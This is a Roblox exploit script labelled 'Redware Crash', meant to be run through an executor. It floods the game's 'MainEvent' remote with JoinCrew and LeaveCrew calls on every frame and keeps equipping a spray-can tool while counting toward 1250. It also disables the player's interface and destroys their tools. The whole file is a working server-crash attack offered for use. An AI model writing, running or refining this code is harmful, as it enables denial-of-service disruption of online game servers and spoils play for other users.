local c = game.Players.LocalPlayer
local backpack = c.Backpack
local a = 1
local CRASHING = Instance.new("ScreenGui")
local Credit = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")

CRASHING.Name = "Redware"
CRASHING.Parent = game.CoreGui
CRASHING.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            
Credit.Name = "Redware"
Credit.Parent = CRASHING
Credit.BackgroundColor3 = Color3.fromRGB(5, 2, 3)
Credit.BorderSizePixel = 0
Credit.Position = UDim2.new(-0.00543900533, 0, 0.125364438, 0)
Credit.Size = UDim2.new(0.3014763, 0, 0.106413998, 0)
            
TextLabel.Parent = Credit
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Position = UDim2.new(0.07, 7, 0.12444, 0)
TextLabel.Size = UDim2.new(0.817010283, 0, 0.684931517, 0)
TextLabel.Font = Enum.Font.Nunito
TextLabel.Text = "nil / 1250"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 40.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = Credit
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.666739, 0, 0.697260189, 0)
TextLabel_2.Size = UDim2.new(0.370103073, 0, 0.284931517, 0)
TextLabel_2.Font = Enum.Font.Nunito
TextLabel_2.Text = "Redware Crash"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 30.000
TextLabel_2.TextWrapped = true
            
local g=game:GetService("GroupService"):GetGroupsAsync(c.UserId)local i={}for a,a in pairs(g)do for a,a in pairs(a)do table.insert(i,a)end end

game:GetService("RunService").RenderStepped:Connect(function() game:GetService("ReplicatedStorage").MainEvent:FireServer("JoinCrew",i[5])game:GetService("ReplicatedStorage").MainEvent:FireServer("LeaveCrew")c.PlayerGui.MainScreenGui.Crew.CrewFrame.Visible=false end)
game:GetService("RunService").RenderStepped:Connect(function()
    game:GetService("Players").LocalPlayer.PlayerGui.MainScreenGui.Enabled = false
    game:GetService('Players').LocalPlayer.PlayerGui.Framework.CurrencySound.Volume = 0
    game:GetService("CoreGui").RobloxGui.Backpack:Destroy()
end)

local player = game.Players.LocalPlayer
for i,v in pairs(backpack:GetChildren()) do
if v:IsA("Tool") then
v:Destroy()
end
end
wait(.5)
game:GetService("RunService").Heartbeat:Connect(function()
    for i,v in pairs(backpack:GetChildren()) do
        if v.Name == "[SprayCan]" then
            v.Parent = game.Players.LocalPlayer.Character
                a = a+1
                TextLabel.Text = "Crashing: "..a.." / 1250"
                    
            if a == 1250 then
                c.Character:FindFirstChildWhichIsA("Humanoid").Health = 0; c.Character:FindFirstChildWhichIsA("Humanoid"):Destroy()
            end
        end
    end
end)
